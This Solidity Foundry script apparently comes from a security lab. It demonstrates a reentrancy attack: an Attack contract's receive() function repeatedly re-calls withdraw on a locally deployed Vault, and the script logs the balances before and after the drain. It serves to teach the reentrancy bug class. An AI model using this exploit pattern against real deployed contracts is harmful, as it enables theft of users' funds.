//SPDX-License-Identifier :MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/re-entrancy.sol";

contract Attack {
    Vault public target;
    uint256 public count;

    constructor (Vault _target) public {
        target = _target;
    }

    function deposit(uint256 _value) external {
        target.deposit{ value : _value }();
    }

    function withdraw(uint256 _amount) external {
        target.withdraw(_amount);
    }

    receive() external payable {
        while (count < 10) {
            count ++;
            target.withdraw(msg.value);
        }    
    }
}

contract POC is Script {
    Vault public target;

    function setUp() external {
        target = new Vault();
    }

    function run() external {
        address user = vm.addr(0x1234);
        Attack attack = new Attack(target);

        vm.startPrank(user);
        vm.deal(address(attack), 1 ether);
        vm.deal(address(target), 10 ether);

        uint256 balance = address(attack).balance;
        console.log("before reentrancy attack: ", balance);

        attack.deposit(1 ether);
        attack.withdraw(1 ether);

        balance = address(attack).balance;
        console.log("after reentrancy attack: ", balance);
    }

}